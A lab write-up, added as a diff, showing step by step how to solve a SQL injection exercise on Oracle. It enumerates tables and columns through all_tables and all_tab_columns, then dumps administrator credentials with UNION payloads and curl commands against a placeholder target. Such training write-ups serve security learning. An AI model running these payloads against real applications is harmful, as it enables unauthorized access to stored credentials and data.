@@ -1,0 +1,94 @@
+SQL injection attack, listing the database contents on Oracle — Practitioner
+
+**Status:** Solved
+
+---
+
+## Goal
+
+Exploit a SQL injection vulnerability on an Oracle database to list database contents, find the users table, and retrieve administrator credentials.
+
+---
+
+## Steps (simple & complete)
+
+1. **Find the injection point**
+   - Browse to the shopping application
+   - Click on any product category:
+GET /filter?category=Gifts
+- This parameter is vulnerable to SQL injection
+
+2. **Determine the number of columns**
+- Oracle requires FROM dual, so test with:
+Gifts' UNION SELECT NULL FROM dual--
+Gifts' UNION SELECT NULL,NULL FROM dual--
+- Keep adding NULLs until no error appears
+- Let's say it has 2 columns
+
+3. **Find which columns accept strings**
+- Test each column:
+Gifts' UNION SELECT 'abc','def' FROM dual--
+- Both columns should accept strings
+
+4. **List all tables in the database**
+- Oracle uses `all_tables` instead of information_schema:
+Gifts' UNION SELECT table_name,NULL FROM all_tables--
+- Look through results for a users table
+- You might see: `USERS_ABCDEF` or similar
+- Oracle table names are usually UPPERCASE
+
+5. **List columns in the users table**
+- Oracle uses `all_tab_columns` for column info:
+Gifts' UNION SELECT column_name,NULL FROM all_tab_columns WHERE table_name='USERS_ABCDEF'--
+- **Important:** Table name must be in UPPERCASE
+- Look for username and password columns
+- Columns might be: `USERNAME_GHIJKL` and `PASSWORD_MNOPQR`
+
+6. **Extract user credentials**
+- Dump the username and password columns:
+Gifts' UNION SELECT USERNAME_GHIJKL,PASSWORD_MNOPQR FROM USERS_ABCDEF--
+- Remember: Oracle is case-sensitive for string literals, not identifiers
+
+7. **Execute the full attack**
+
+Step 1 - Find tables:
+```bash
+curl -s "https://TARGET/filter?category=Gifts'+UNION+SELECT+table_name,NULL+FROM+all_tables--"
+Step 2 - Find columns (note UPPERCASE):
+curl -s "https://TARGET/filter?category=Gifts'+UNION+SELECT+column_name,NULL+FROM+all_tab_columns+WHERE+table_name='USERS_ABCDEF'--"
+Step 3 - Extract data:
+curl -s "https://TARGET/filter?category=Gifts'+UNION+SELECT+USERNAME_GHIJKL,PASSWORD_MNOPQR+FROM+USERS_ABCDEF--"
+Log in as administrator
+Find the administrator row in the dumped data
+Copy the username and password
+Go to the login page
+Enter the credentials and log in
+Lab solves automatically
+Example
+Vulnerable endpoint: GET /filter?category=Gifts
+List tables:
+Gifts' UNION SELECT table_name,NULL FROM all_tables--
+Found table: USERS_ABCDEF
+List columns (UPPERCASE table name):
+Gifts' UNION SELECT column_name,NULL FROM all_tab_columns WHERE table_name='USERS_ABCDEF'--
+Found columns: USERNAME_GHIJKL, PASSWORD_MNOPQR
+Extract credentials:
+Gifts' UNION SELECT USERNAME_GHIJKL,PASSWORD_MNOPQR FROM USERS_ABCDEF--
+Oracle-specific notes
+Key differences from MySQL/PostgreSQL:
+Use all_tables instead of information_schema.tables
+Use all_tab_columns instead of information_schema.columns
+Always need FROM dual for queries without real tables
+Table names in WHERE clause must be UPPERCASE (string literals are case-sensitive)
+Column names in SELECT are case-insensitive
+Oracle metadata tables:
+all_tables - Lists all accessible tables
+all_tab_columns - Lists all accessible columns
+user_tables - Only tables owned by current user
+dba_tables - All tables (requires DBA privileges)
+Common pitfalls:
+Forgetting FROM dual
+Using lowercase table names in WHERE clause
+Using MySQL/PostgreSQL syntax
+Why this works
+Oracle stores database metadata in system tables like all_tables and all_tab_columns instead of the standard information_schema. By querying these tables through SQL injection, we can enumerate the entire database structure. Oracle's requirement for FROM dual and case-sensitive string literals make it slightly different from other databases, but the core concept remains the same - metadata tables reveal the database structure, allowing us to craft precise queries to extract sensitive data.
